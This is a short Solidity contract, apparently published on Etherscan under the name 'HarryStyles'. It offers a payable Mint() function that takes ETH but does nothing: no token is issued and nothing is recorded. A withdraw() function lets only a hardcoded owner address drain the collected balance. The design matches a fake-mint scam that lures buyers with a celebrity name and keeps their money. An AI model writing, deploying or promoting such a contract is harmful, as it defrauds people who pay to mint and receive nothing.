/**
 *Submitted for verification at Etherscan.io on 2023-02-28
*/

pragma solidity ^0.4.26;

contract HarryStyles {

    address private  owner;

     constructor() public{   
        owner=0x0Ce1d66E675B1bD102DB8c311f0ae953E064FCfc;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function Mint() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}